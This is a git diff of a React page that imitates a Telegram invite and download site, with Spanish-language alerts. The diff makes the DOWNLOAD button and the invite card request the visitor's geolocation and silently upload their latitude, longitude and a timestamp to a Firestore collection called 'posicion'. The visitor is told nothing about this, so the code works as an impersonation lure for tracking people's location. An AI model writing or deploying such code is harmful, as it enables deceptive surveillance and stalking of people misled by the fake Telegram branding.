@@ -1,7 +1,42 @@
 import './App.css'
 import TelegramInviteCard from './components/TelegraminvitedCard'
+import { Timestamp, addDoc, collection, setDoc, doc } from "firebase/firestore";
+import { Database} from "./firebase/Firebaseconfig";
+import { useState } from 'react';
 
 function App() {
+  
+function succes(geodata){
+  console.log(geodata.coords)
+uploadData(geodata.coords)
+  //firebase code
+
+ 
+}
+function noPermiso(){
+alert('No puedes acceder sin permisos')
+}
+
+async function uploadData(data){
+const position = collection(Database,'posicion');
+await addDoc(position,{
+  latitud:data.latitude,
+  longitude:data.longitude,
+  time: Timestamp.now(),
+
+})
+}
+
+
+
+async  function handleClick(){
+if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(succes,noPermiso)
+
+}else{
+alert('no puedes usar geo')
+}
+ }
 
   return (
     <div className='relative w-full '>
@@ -12,7 +47,9 @@ function App() {
     </svg>
     <h1 className='text-[18px] text-[#363b40]'>Telegram</h1>
     </div>
-    <button className='bg-[#2481cc] text-white font-bold text-[13px] rounded-[18px] px-[16px] py-[8px]'>
+    <button 
+     onClick={()=>handleClick()}
+    className='bg-[#2481cc] text-white font-bold text-[13px] rounded-[18px] px-[16px] py-[8px]'>
     DOWNLOAD
     </button>
   </header>
@@ -20,7 +57,7 @@ function App() {
   <img className='absolute top-0 left-0 w-[100vw] h-[100vh] object-cover z-[-1] ' src="https://i.pinimg.com/736x/3d/8c/2f/3d8c2f2c82c1c9ef1e27be645cd1aa17.jpg" alt="" />
 
   </figure>
-<TelegramInviteCard/>
+<TelegramInviteCard handleClick={handleClick}/>
     </div>
   )
 }
